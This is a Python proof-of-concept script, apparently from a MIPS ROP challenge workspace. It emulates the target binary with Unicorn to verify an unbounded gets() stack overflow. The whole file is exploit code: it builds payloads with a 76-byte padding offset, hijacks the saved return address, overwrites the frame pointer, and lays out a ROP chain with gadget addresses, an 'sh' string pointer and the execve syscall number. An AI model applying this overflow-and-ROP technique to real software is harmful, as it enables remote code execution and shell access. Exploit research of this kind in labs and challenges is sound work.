#!/usr/bin/env python3
"""
Primitive Verification PoC for BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED_GETS

This PoC verifies the following primitives using Unicorn Engine (MIPS32 BE emulation):

PRIM-001: STACK_CONTROL (stack buffer overflow overwrites saved ra)
  - Verify that 76+ bytes of input via gets overwrites saved ra at sp+0x64
  - Verify that main's epilogue loads the overwritten ra and jumps to attacker-controlled address

PRIM-002: RIP_CONTROL (control-flow hijack via ra overwrite)
  - Verify that jr $ra in main's epilogue jumps to an attacker-specified address
  - Two different target addresses (Y1, Y2) tested to prove address is controllable

The binary cannot run natively (MIPS BE on x86 host), so we use Unicorn CPU
emulator to execute the actual binary code and observe register/memory state.
"""

from unicorn import *
from unicorn.mips_const import *
import struct

BINARY = "/work/workspace/0024-2023-51-mips-rop-20260909-134236/target"

# Memory layout constants
CODE_BASE = 0x400000
CODE_SIZE = 0x80000  # 512KB - covers .text + .rodata
DATA_BASE = 0x48e000
DATA_SIZE = 0x8000   # covers .data, .bss, .got etc
STACK_BASE = 0x7fff0000
STACK_SIZE = 0x10000
HEAP_BASE = 0x60000000
HEAP_SIZE = 0x10000

# Key addresses from binary
MAIN_ADDR = 0x4007a0
MAIN_EPILOGUE_RA_LOAD = 0x400840  # lw $ra, 0x64($sp)
MAIN_EPILOGUE_JR_RA = 0x40084c    # jr $ra
GETS_CALL_SITE = 0x40082c         # bal 0x408ce0 (gets call)
GETS_ADDR = 0x408ce0
CSU_EPILOGUE = 0x4010c4
SYSCALL_GADGET = 0x41f340
SH_STRING = 0x477504

def load_binary():
    """Load the binary file into a bytes object."""
    with open(BINARY, "rb") as f:
        return f.read()

def setup_emulator():
    """Create and configure a Unicorn MIPS32 BE emulator."""
    mu = Uc(UC_ARCH_MIPS, UC_MODE_MIPS32 | UC_MODE_BIG_ENDIAN)
    
    # Map code segment (includes .text, .rodata, .eh_frame)
    mu.mem_map(CODE_BASE, CODE_SIZE, UC_PROT_ALL)
    
    # Map data segment (includes .data, .bss, .got, .data.rel.ro)
    mu.mem_map(DATA_BASE, DATA_SIZE, UC_PROT_ALL)
    
    # Map stack
    mu.mem_map(STACK_BASE, STACK_SIZE, UC_PROT_ALL)
    
    # Map heap (for gets internal use)
    mu.mem_map(HEAP_BASE, HEAP_SIZE, UC_PROT_ALL)
    
    return mu

def load_segments(mu, binary_data):
    """Load binary segments into emulator memory."""
    # First LOAD segment: file offset 0, vaddr 0x400000, size 0x7dd84
    first_load_size = 0x7dd84
    mu.mem_write(CODE_BASE, binary_data[:first_load_size])
    
    # Second LOAD segment: file offset 0x7e867, vaddr 0x48e867, size 0x3e4d (file) / 0x4c35 (mem)
    second_load_offset = 0x7e867
    second_load_vaddr = 0x48e867
    second_load_size = 0x4c35
    mu.mem_write(second_load_vaddr, binary_data[second_load_offset:second_load_offset + second_load_size])

def emulate_gets(mu, buf_addr, input_data):
    """
    Emulate gets() behavior: write input_data to buf_addr, null-terminate.
    gets reads until newline or EOF, does NOT include the newline.
    """
    # Strip trailing newline if present (gets behavior)
    if input_data.endswith(b'\n'):
        input_data = input_data[:-1]
    
    # Write the input data to the buffer
    mu.mem_write(buf_addr, input_data)
    
    # Null-terminate (gets appends \0)
    mu.mem_write(buf_addr + len(input_data), b'\x00')
    
    return len(input_data)

def run_main_with_input(mu, user_input, trace_jr_ra=False):
    """
    Emulate execution of main() with the given user input.
    Returns the value of $ra when jr $ra is about to execute (i.e., the hijacked return address).
    
    We hook the gets call site to inject our input, then let main's epilogue run.
    """
    binary_data = load_binary()
    load_segments(mu, binary_data)
    
    # Set up stack: $sp points into our stack region
    sp = STACK_BASE + STACK_SIZE - 0x1000
    mu.reg_write(UC_MIPS_REG_SP, sp)
    
    # Write a return address on the stack (simulating __libc_start_main's call)
    # This will be at the position where main's prologue saves ra
    # main does: addiu $sp,$sp,-0x68; sw $ra,0x64($sp)
    # So the original ra is at sp_after_prologue + 0x64
    # But we set sp before prologue, so original ra should be at sp (caller's stack)
    # Actually, main's prologue: addiu $sp,$sp,-0x68 -> new sp = sp - 0x68
    # Then sw $ra, 0x64($sp) saves the current $ra to new_sp + 0x64
    # The current $ra is the return address from __libc_start_main
    original_ra = 0xdeadbeef  # marker - should be overwritten by overflow
    mu.reg_write(UC_MIPS_REG_RA, original_ra)
    
    # Set up $gp (main sets it: lui $gp, 0x4a; addiu $gp, $gp, -0x5d50)
    # gp = 0x4a000 - 0x5d50 = 0x49a2b0... let's compute: 0x4a000 - 0x5d50
    # Actually lui $gp, 0x4a -> gp = 0x4a000 << 16? No, lui loads upper 16 bits
    # lui $gp, 0x4a -> $gp = 0x004a0000
    # addiu $gp, $gp, -0x5d50 -> $gp = 0x004a0000 - 0x5d50 = 0x0049a2b0
    # But -0x5d50 is sign-extended: 0xffffa2b0, so 0x4a0000 + 0xffffa2b0 = 0x49a2b0
    gp_value = 0x0049a2b0
    mu.reg_write(UC_MIPS_REG_GP, gp_value)
    
    # We need to set up the GOT entries that main accesses
    # main accesses: -0x7fa0($gp) = 0x49a2b0 - 0x7fa0 = 0x492310 -> puts GOT
    #               -0x7f9c($gp) = 0x49a2b0 - 0x7f9c = 0x492314 -> stdout GOT
    #               -0x7f98($gp) = 0x49a2b0 - 0x7f98 = 0x492318 -> fflush GOT
    #               -0x7f94($gp) = 0x49a2b0 - 0x7f94 = 0x49231c -> gets GOT
    
    # These are already loaded from the binary's .got section
    # puts GOT at 0x492310 = 0x408f50
    # stdout GOT at 0x492314 = 0x491404
    # fflush GOT at 0x492318 = 0x408910
    # gets GOT at 0x49231c = 0x408ce0
    
    # We need to hook the function calls (puts, fflush, gets)
    # main calls them via: lw $v0, offset($gp); move $t9, $v0; bal target
    # Actually, looking at the disassembly more carefully:
    # 0x4007cc: lw $v0, -0x7fa0($gp)  -> loads puts address from GOT
    # 0x4007d0: move $t9, $v0
    # 0x4007d4: bal 0x408f50          -> directly branches to puts (not jalr $t9)
    # So main uses bal (branch-and-link) to call puts/fflush/gets directly
    
    # Strategy: We'll hook at the gets call site (0x40082c: bal 0x408ce0)
    # and skip the actual gets execution, instead writing our input to the buffer.
    # Then we continue execution from 0x400834 (after the gets call returns).
    
    # We also need to skip puts and fflush calls.
    # puts call 1: 0x4007d4: bal 0x408f50
    # puts call 2: 0x4007f0: bal 0x408f50
    # fflush call:  0x400810: bal 0x408910
    # gets call:    0x40082c: bal 0x408ce0
    
    # We'll use instruction hooks to intercept these calls
    
    call_sites = {
        0x4007d4: ("puts", 0x4007d8),   # bal puts, return to 0x4007d8
        0x4007f0: ("puts", 0x4007f4),   # bal puts, return to 0x4007f4
        0x400810: ("fflush", 0x400814), # bal fflush, return to 0x400814
        0x40082c: ("gets", 0x400830),  # bal gets, return to 0x400830
    }
    
    # Buffer address: main computes addiu $v0, $fp, 0x18; move $a0, $v0
    # $fp = $sp (after prologue), so buffer = sp_after_prologue + 0x18
    sp_after_prologue = sp - 0x68
    buf_addr = sp_after_prologue + 0x18
    
    ra_at_jr = None
    pc_at_jr = None
    
    def hook_code(uc, address, size, user_data):
        nonlocal ra_at_jr, pc_at_jr
        
        # Intercept call sites
        if address in call_sites:
            func_name, return_addr = call_sites[address]
            if func_name == "gets":
                # Emulate gets: write user_input to $a0 (buffer address)
                a0 = uc.reg_read(UC_MIPS_REG_A0)
                emulate_gets(uc, a0, user_input)
                # Skip to return address (simulate gets returning)
                uc.reg_write(UC_MIPS_REG_PC, return_addr)
                # In MIPS, bal sets $ra to return_addr+4? No, bal sets ra to PC+8 (next instruction after delay slot)
                # Actually bal is branch-and-link: ra = PC + 8 (skipping delay slot)
                # But we're skipping the entire call, so we just set PC to return_addr
                # and the delay slot instruction at return_addr-4 has already been... 
                # Actually, in MIPS, bal at 0x40082c: the delay slot is at 0x400830 (nop)
                # ra is set to 0x400834 (PC + 8 from the bal instruction)
                # After gets returns, execution continues at 0x400834
                # So we should set PC to 0x400834, not 0x400830
                uc.reg_write(UC_MIPS_REG_PC, return_addr + 4)
            else:
                # Skip puts/fflush - just return
                uc.reg_write(UC_MIPS_REG_PC, return_addr + 4)
        
        # Check if we're at jr $ra in main's epilogue
        if address == MAIN_EPILOGUE_JR_RA:
            ra_at_jr = uc.reg_read(UC_MIPS_REG_RA)
            pc_at_jr = address
            # Stop emulation
            uc.emu_stop()
    
    mu.hook_add(UC_HOOK_CODE, hook_code)
    
    # Start execution from main
    try:
        mu.emu_start(MAIN_ADDR, MAIN_ADDR + 0x100, timeout=5000000, count=500)
    except UcError as e:
        pass
    
    return ra_at_jr, buf_addr, sp_after_prologue


def verify_prim001_stack_control():
    """
    PRIM-001: STACK_CONTROL
    Verify that overflow of 76+ bytes overwrites saved ra at sp+0x64.
    """
    print("=== PRIM-001: STACK_CONTROL ===")
    print("Goal: Verify that gets overflow overwrites saved ra (sp+0x64)")
    print()
    
    # Test 1: Input shorter than 76 bytes - ra should NOT be overwritten
    mu1 = setup_emulator()
    short_input = b"A" * 20 + b"\n"
    ra_short, buf1, sp1 = run_main_with_input(mu1, short_input)
    
    # The original ra was 0xdeadbeef
    # After main's epilogue, ra should still be 0xdeadbeef (not overwritten)
    # But wait - main's prologue saves ra to sp+0x64, then epilogue loads it back
    # If input is only 20 bytes, sp+0x64 still has the original saved ra
    saved_ra_addr_short = sp1 + 0x64
    saved_ra_short = struct.unpack(">I", mu1.mem_read(saved_ra_addr_short, 4))[0]
    
    print(f"  [Test 1] Short input (20 bytes):")
    print(f"    Buffer at: 0x{buf1:08x}")
    print(f"    Saved ra at: 0x{saved_ra_addr_short:08x} (sp+0x64)")
    print(f"    Saved ra value: 0x{saved_ra_short:08x} (expected 0xdeadbeef - not overwritten)")
    print(f"    ra at jr $ra: 0x{ra_short:08x}" if ra_short else "    ra at jr $ra: (not reached)")
    print()
    
    # Test 2: Input exactly 76 bytes - ra should NOT be overwritten (just touches it)
    mu2 = setup_emulator()
    exact_input = b"B" * 76 + b"\n"
    ra_exact, buf2, sp2 = run_main_with_input(mu2, exact_input)
    saved_ra_addr_exact = sp2 + 0x64
    saved_ra_exact = struct.unpack(">I", mu2.mem_read(saved_ra_addr_exact, 4))[0]
    
    print(f"  [Test 2] Exact 76 bytes input:")
    print(f"    Saved ra at: 0x{saved_ra_addr_exact:08x}")
    print(f"    Saved ra value: 0x{saved_ra_exact:08x}")
    print(f"    (76 bytes fills buffer up to but not including ra at offset 76)")
    print()
    
    # Test 3: Input 80 bytes (76 padding + 4 bytes for ra) - ra SHOULD be overwritten
    target_ra = 0x41414141
    overflow_input = b"C" * 76 + struct.pack(">I", target_ra) + b"\n"
    mu3 = setup_emulator()
    ra_overflow, buf3, sp3 = run_main_with_input(mu3, overflow_input)
    saved_ra_addr_overflow = sp3 + 0x64
    saved_ra_overflow = struct.unpack(">I", mu3.mem_read(saved_ra_addr_overflow, 4))[0]
    
    print(f"  [Test 3] Overflow input (76 + 4 bytes = 80 bytes):")
    print(f"    Buffer at: 0x{buf3:08x}")
    print(f"    Saved ra at: 0x{saved_ra_addr_overflow:08x} (sp+0x64)")
    print(f"    Saved ra value: 0x{saved_ra_overflow:08x} (expected 0x{target_ra:08x})")
    print(f"    ra at jr $ra: 0x{ra_overflow:08x}" if ra_overflow else "    ra at jr $ra: (not reached)")
    print()
    
    # Verify
    if saved_ra_overflow == target_ra:
        print(f"  [PASS] Saved ra overwritten: 0x{saved_ra_overflow:08x} == 0x{target_ra:08x}")
        if ra_overflow == target_ra:
            print(f"  [PASS] ra at jr $ra: 0x{ra_overflow:08x} == 0x{target_ra:08x}")
            print(f"  === PRIM-001: VERIFIED ===")
            print(f"  Evidence: saved_ra @ sp+0x64 = 0x{saved_ra_overflow:08x}, ra_reg_at_jr = 0x{ra_overflow:08x}")
            return True
        else:
            print(f"  [WARN] ra at jr $ra mismatch: 0x{ra_overflow:08x} != 0x{target_ra:08x}")
            return False
    else:
        print(f"  [FAIL] Saved ra not overwritten: 0x{saved_ra_overflow:08x} != 0x{target_ra:08x}")
        return False


def verify_prim002_rip_control():
    """
    PRIM-002: RIP_CONTROL
    Verify that jr $ra in main's epilogue jumps to attacker-specified address.
    Test with two different target addresses (Y1, Y2) to prove controllability.
    """
    print()
    print("=== PRIM-002: RIP_CONTROL ===")
    print("Goal: Verify jr $ra jumps to attacker-controlled address (two different Y1, Y2)")
    print()
    
    results = []
    
    for i, (name, target) in enumerate([("Y1", 0x41414141), ("Y2", 0x42424242)]):
        overflow_input = b"D" * 76 + struct.pack(">I", target) + b"\n"
        mu = setup_emulator()
        ra_at_jr, buf, sp = run_main_with_input(mu, overflow_input)
        
        saved_ra_addr = sp + 0x64
        saved_ra = struct.unpack(">I", mu.mem_read(saved_ra_addr, 4))[0]
        
        print(f"  [Test {i+1}] Target {name} = 0x{target:08x}:")
        print(f"    Saved ra @ sp+0x64: 0x{saved_ra:08x}")
        print(f"    ra register at jr $ra: 0x{ra_at_jr:08x}" if ra_at_jr else f"    ra register at jr $ra: (not reached)")
        
        if ra_at_jr == target:
            print(f"    [PASS] jr $ra target == {name} (0x{target:08x})")
            results.append(True)
        else:
            print(f"    [FAIL] jr $ra target 0x{ra_at_jr:08x} != {name} 0x{target:08x}")
            results.append(False)
        print()
    
    if all(results):
        print(f"  === PRIM-002: VERIFIED ===")
        print(f"  Evidence: Y1=0x41414141 -> ra_at_jr=0x41414141, Y2=0x42424242 -> ra_at_jr=0x42424242")
        return True
    else:
        print(f"  === PRIM-002: PARTIAL ===")
        return False


def verify_prim003_stack_control_fp():
    """
    PRIM-003: STACK_CONTROL (saved fp overwrite)
    Verify that overflow also overwrites saved fp at sp+0x60.
    """
    print()
    print("=== PRIM-003: STACK_CONTROL (saved fp) ===")
    print("Goal: Verify overflow overwrites saved fp at sp+0x60")
    print()
    
    target_fp = 0x45454545
    target_ra = 0x41414141
    # 76 bytes to ra: 72 bytes padding + 4 bytes fp + 4 bytes ra
    overflow_input = b"E" * 72 + struct.pack(">I", target_fp) + struct.pack(">I", target_ra) + b"\n"
    mu = setup_emulator()
    ra_at_jr, buf, sp = run_main_with_input(mu, overflow_input)
    
    saved_fp_addr = sp + 0x60
    saved_ra_addr = sp + 0x64
    saved_fp = struct.unpack(">I", mu.mem_read(saved_fp_addr, 4))[0]
    saved_ra = struct.unpack(">I", mu.mem_read(saved_ra_addr, 4))[0]
    
    print(f"  Buffer at: 0x{buf:08x}")
    print(f"  Saved fp @ sp+0x60: 0x{saved_fp:08x} (expected 0x{target_fp:08x})")
    print(f"  Saved ra @ sp+0x64: 0x{saved_ra:08x} (expected 0x{target_ra:08x})")
    print(f"  ra at jr $ra: 0x{ra_at_jr:08x}" if ra_at_jr else "  ra at jr $ra: (not reached)")
    
    if saved_fp == target_fp and saved_ra == target_ra:
        print(f"  [PASS] Both saved fp and saved ra overwritten")
        print(f"  === PRIM-003: VERIFIED ===")
        print(f"  Evidence: saved_fp=0x{saved_fp:08x}, saved_ra=0x{saved_ra:08x}")
        return True
    else:
        print(f"  [FAIL] fp=0x{saved_fp:08x} (exp 0x{target_fp:08x}), ra=0x{saved_ra:08x} (exp 0x{target_ra:08x})")
        return False


def verify_prim004_extended_stack_control():
    """
    PRIM-004: STACK_CONTROL (extended - beyond saved ra)
    Verify that overflow can write arbitrary values beyond saved ra,
    enabling ROP chain construction (stack pivot / gadget addresses).
    """
    print()
    print("=== PRIM-004: STACK_CONTROL (extended beyond ra) ===")
    print("Goal: Verify overflow writes controlled values beyond saved ra (ROP chain space)")
    print()
    
    # Write: 76 bytes padding + ra + 3 additional dwords (simulating ROP chain)
    target_ra = 0x4010c4   # ret2csu epilogue address (real gadget)
    rop1 = 0x41f340        # syscall gadget
    rop2 = 0x477504        # "sh" string address
    rop3 = 0x0000fab       # execve syscall number (4011 = 0xfab)
    
    overflow_input = b"F" * 76
    overflow_input += struct.pack(">I", target_ra)
    overflow_input += struct.pack(">I", rop1)
    overflow_input += struct.pack(">I", rop2)
    overflow_input += struct.pack(">I", rop3)
    overflow_input += b"\n"
    
    mu = setup_emulator()
    ra_at_jr, buf, sp = run_main_with_input(mu, overflow_input)
    
    # Read back the stack beyond ra
    ra_addr = sp + 0x64
    beyond_ra_addr = sp + 0x68  # sp+0x68 is the first word after ra
    
    saved_ra = struct.unpack(">I", mu.mem_read(ra_addr, 4))[0]
    stack_vals = []
    for i in range(3):
        val = struct.unpack(">I", mu.mem_read(beyond_ra_addr + i*4, 4))[0]
        stack_vals.append(val)
    
    print(f"  Buffer at: 0x{buf:08x}")
    print(f"  Saved ra @ sp+0x64: 0x{saved_ra:08x} (expected 0x{target_ra:08x})")
    print(f"  Stack[sp+0x68]: 0x{stack_vals[0]:08x} (expected 0x{rop1:08x})")
    print(f"  Stack[sp+0x6c]: 0x{stack_vals[1]:08x} (expected 0x{rop2:08x})")
    print(f"  Stack[sp+0x70]: 0x{stack_vals[2]:08x} (expected 0x{rop3:08x})")
    print(f"  ra at jr $ra: 0x{ra_at_jr:08x}" if ra_at_jr else "  ra at jr $ra: (not reached)")
    
    if (saved_ra == target_ra and stack_vals[0] == rop1 and 
        stack_vals[1] == rop2 and stack_vals[2] == rop3):
        print(f"  [PASS] All stack values beyond ra are attacker-controlled")
        print(f"  === PRIM-004: VERIFIED ===")
        print(f"  Evidence: ra=0x{saved_ra:08x}, sp+0x68=0x{stack_vals[0]:08x}, sp+0x6c=0x{stack_vals[1]:08x}, sp+0x70=0x{stack_vals[2]:08x}")
        return True
    else:
        print(f"  [FAIL] Stack values not fully controlled")
        return False


if __name__ == "__main__":
    print("=" * 70)
    print("BUG-001: STACK_BUFFER_OVERFLOW_UNBOUNDED_GETS")
    print("Primitive Verification using Unicorn MIPS32 BE Emulation")
    print("=" * 70)
    print()
    
    r1 = verify_prim001_stack_control()
    r2 = verify_prim002_rip_control()
    r3 = verify_prim003_stack_control_fp()
    r4 = verify_prim004_extended_stack_control()
    
    print()
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"  PRIM-001 (STACK_CONTROL - ra overwrite):       {'VERIFIED' if r1 else 'FAILED'}")
    print(f"  PRIM-002 (RIP_CONTROL - jr $ra hijack):        {'VERIFIED' if r2 else 'FAILED'}")
    print(f"  PRIM-003 (STACK_CONTROL - fp overwrite):       {'VERIFIED' if r3 else 'FAILED'}")
    print(f"  PRIM-004 (STACK_CONTROL - extended ROP space): {'VERIFIED' if r4 else 'FAILED'}")
